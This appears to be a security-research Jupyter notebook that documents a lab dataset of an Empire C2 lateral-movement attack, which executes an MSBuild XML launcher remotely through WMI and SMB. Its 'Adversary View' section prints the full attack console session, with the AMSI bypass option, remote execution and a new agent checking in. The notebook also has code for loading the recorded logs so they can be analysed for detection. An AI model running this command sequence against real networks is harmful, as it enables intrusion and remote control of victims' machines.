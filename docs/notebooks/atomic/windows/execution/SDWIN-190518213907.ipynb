{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "5c0ed0db",
   "metadata": {},
   "source": [
    "# Empire Invoke Execute MSBuild"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f0be2244",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5cd7a468",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/05/18 |\n",
    "| Modification Date | 2020/09/20 |\n",
    "| Tactics           | [TA0002](https://attack.mitre.org/tactics/TA0002),[TA0008](https://attack.mitre.org/tactics/TA0008) |\n",
    "| Techniques        | [T1047](https://attack.mitre.org/techniques/T1047) |\n",
    "| Tags              | WMI IWbemServices ExecMethod,SMB CreateRequest |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ac37c932",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents an adversary remotely creating a file (.xml) via SMB and executing it remotetly via WMI and msbuild. This dataset focuses on the use of the WMI Win32_Process class and method Create to execute code remotely."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f5a35f52",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a0d02422",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_msbuild_dcerpc_wmi_smb.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_msbuild_dcerpc_wmi_smb.zip) |\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/empire_msbuild_dcerpc_wmi_smb.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/empire_msbuild_dcerpc_wmi_smb.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "34b86d26",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b6bf00ef",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6d7bc4eb",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [invoke_executemsbuild](https://github.com/EmpireProject/Empire/blob/dev/data/module_source/lateral_movement/Invoke-ExecuteMSBuild.ps1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7c7782b3",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: stager/multi/launcher) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "A7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \n",
    "HBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \n",
    "UF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 21:28:07  http            \n",
    "AWTK7BX5 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         2228   5/0.0    2020-09-20 21:33:05  http            \n",
    "\n",
    "(Empire: agents) > interact AWTK7BX5  \n",
    "(Empire: AWTK7BX5) > usemodule lateral_movement/invoke_executemsbuild\n",
    "(Empire: powershell/lateral_movement/invoke_executemsbuild) > info\n",
    "\n",
    "              Name: Invoke-ExecuteMSBuild\n",
    "            Module: powershell/lateral_movement/invoke_executemsbuild\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: False\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: False\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @xorrior\n",
    "\n",
    "Description:\n",
    "  This module utilizes WMI and MSBuild to compile and execute\n",
    "  an xml file containing an Empire launcher\n",
    "\n",
    "Comments:\n",
    "  Inspired by @subtee\n",
    "  http://subt0x10.blogspot.com/2016/09/bypassing-application-\n",
    "  whitelisting.html\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name             Required    Value                     Description\n",
    "  ----             --------    -------                   -----------\n",
    "  Agent            True        AWTK7BX5                  Agent to run module from.               \n",
    "  Listener         False                                 Listener to use.                        \n",
    "  Command          False                                 Custom command to run.                  \n",
    "  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n",
    "                                                        powershell code, uses the               \n",
    "                                                        ObfuscateCommand for obfuscation types. \n",
    "                                                        For powershell only.                    \n",
    "  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n",
    "                                                        Only used if Obfuscate switch is True.  \n",
    "                                                        For powershell only.                    \n",
    "  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n",
    "                                                        the stager code.                        \n",
    "  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n",
    "                                                        the stager code.                        \n",
    "  CredID           False                                 CredID from the store to use.           \n",
    "  UserAgent        False       default                   User-agent string to use for the staging\n",
    "                                                        request (default, none, or other).      \n",
    "  Proxy            False       default                   Proxy to use for request (default, none,\n",
    "                                                        or other).                              \n",
    "  ProxyCreds       False       default                   Proxy credentials                       \n",
    "                                                        ([domain\\]username:password) to use for \n",
    "                                                        request (default, none, or other).      \n",
    "  ComputerName     True                                  Host to target                          \n",
    "  UserName         False                                 UserName if executing with credentials  \n",
    "  Password         False                                 Password if executing with credentials  \n",
    "  FilePath         False                                 Desired location to copy the xml file on\n",
    "                                                        the target                              \n",
    "  DriveLetter      False                                 Drive letter to use when mounting the   \n",
    "                                                        share locally                           \n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_executemsbuild) > set Listener http\n",
    "(Empire: powershell/lateral_movement/invoke_executemsbuild) > set ComputerName WORKSTATION6.theshire.local\n",
    "(Empire: powershell/lateral_movement/invoke_executemsbuild) > execute\n",
    "[>] Module is not opsec safe, run? [y/N] y\n",
    "[*] Tasked AWTK7BX5 to run TASK_CMD_WAIT\n",
    "[*] Agent AWTK7BX5 tasked with task ID 1\n",
    "[*] Tasked agent AWTK7BX5 to run module powershell/lateral_movement/invoke_executemsbuild\n",
    "(Empire: powershell/lateral_movement/invoke_executemsbuild) > \n",
    "[*] Sending POWERSHELL stager (stage 1) to 172.18.39.6\n",
    "[*] New agent U63RL1XZ checked in\n",
    "[+] Initial agent U63RL1XZ from 172.18.39.6 now active (Slack)\n",
    "[*] Sending agent (stage 2) to U63RL1XZ at 172.18.39.6\n",
    "\n",
    "__GENUS          : 2\n",
    "__CLASS          : __PARAMETERS\n",
    "__SUPERCLASS     : \n",
    "__DYNASTY        : __PARAMETERS\n",
    "__RELPATH        : \n",
    "__PROPERTY_COUNT : 2\n",
    "__DERIVATION     : {}\n",
    "__SERVER         : \n",
    "__NAMESPACE      : \n",
    "__PATH           : \n",
    "ProcessId        : 6952\n",
    "ReturnValue      : 0\n",
    "PSComputerName   : \n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_executemsbuild) > \n",
    "(Empire: powershell/lateral_movement/invoke_executemsbuild) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "A7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \n",
    "HBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \n",
    "UF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 21:28:07  http\n",
    "AWTK7BX5 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         2228   5/0.0    2020-09-20 21:39:34  http            \n",
    "U63RL1XZ ps 172.18.39.6     WORKSTATION6      *THESHIRE\\pgustavo      powershell         3008   5/0.0    2020-09-20 21:39:35  http            \n",
    "\n",
    "(Empire: agents) > interact U63RL1XZ\n",
    "(Empire: U63RL1XZ) > shell whoami\n",
    "[*] Tasked U63RL1XZ to run TASK_SHELL\n",
    "[*] Agent U63RL1XZ tasked with task ID 1\n",
    "(Empire: U63RL1XZ) > \n",
    "theshire\\pgustavo\n",
    "\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: U63RL1XZ) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "43ef8e8d",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6673ed6f",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7ae2de67",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_msbuild_dcerpc_wmi_smb.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3bf30732",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4fcbe9fe",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dfed5175",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ebb791fa",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6037ea56",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://blog.f-secure.com/endpoint-detection-of-remote-service-creation-and-psexec/](https://blog.f-secure.com/endpoint-detection-of-remote-service-creation-and-psexec/) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
